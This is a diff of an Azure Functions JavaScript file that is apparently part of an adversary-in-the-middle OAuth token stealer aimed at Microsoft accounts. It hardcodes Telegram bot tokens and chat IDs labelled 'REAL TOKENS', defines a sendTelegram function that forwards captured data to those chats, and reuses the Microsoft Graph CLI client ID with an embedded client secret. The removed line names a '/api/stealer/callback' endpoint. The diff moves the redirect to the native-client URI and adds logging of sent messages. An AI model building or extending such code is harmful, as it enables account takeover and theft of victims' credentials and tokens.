@@ -1,16 +1,16 @@
 const { app } = require("@azure/functions");
 const axios = require('axios');
 
-// Telegram configuration
+// Telegram configuration - REAL TOKENS
 const TELEGRAM_BOT_TOKEN = "7768080373:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
 const TELEGRAM_CHAT_ID = "6743632244";
 const TELEGRAM_BOT_TOKEN2 = "7942871168:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
 const TELEGRAM_CHAT_ID2 = "6263177378";
 
-// OAuth configuration
+// OAuth configuration - Using Microsoft Graph CLI client ID
 const client_id = '14d82eec-204b-4c2f-b7e8-296a70dab67e';
 const client_secret = process.env.AZURE_CLIENT_SECRET || 'DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa';
-const redirect_uri = 'https://aitm-func-new-1754085350.azurewebsites.net/api/stealer/callback';
+const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
 const token_endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
 
 async function sendTelegram(message, isSecondary = false) {
@@ -23,6 +23,7 @@ async function sendTelegram(message, isSecondary = false) {
             text: message,
             parse_mode: 'HTML'
         });
+        console.log(`Telegram message sent: ${message.substring(0, 50)}...`);
     } catch (error) {
         console.error('Telegram send error:', error.message);
     }
